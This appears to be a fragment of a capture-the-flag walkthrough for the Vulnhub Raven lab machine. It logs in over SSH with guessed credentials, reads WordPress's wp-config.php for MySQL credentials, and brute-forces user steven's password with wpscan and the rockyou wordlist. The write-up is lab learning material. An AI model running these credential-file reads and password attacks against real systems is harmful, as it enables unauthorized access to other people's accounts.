test
Login ssh with user michael@ip and password: michael

found config belong to wordpress credentials, these looks like mysql credential

atfirst visit to cd /var/www/html/wordpress

cat wp-config.php

<img width="814" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/a2731812-fd5b-4212-9081-f3b26ee78a37">


Cracking user steven with wpscan tools

**Command : wpscan --url raven.local -usernames steven -passwords /usr/share/wordlists/rockyou.txt**

<img width="708" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/5ee84fd3-b7e9-4677-81bf-120888c9125d">
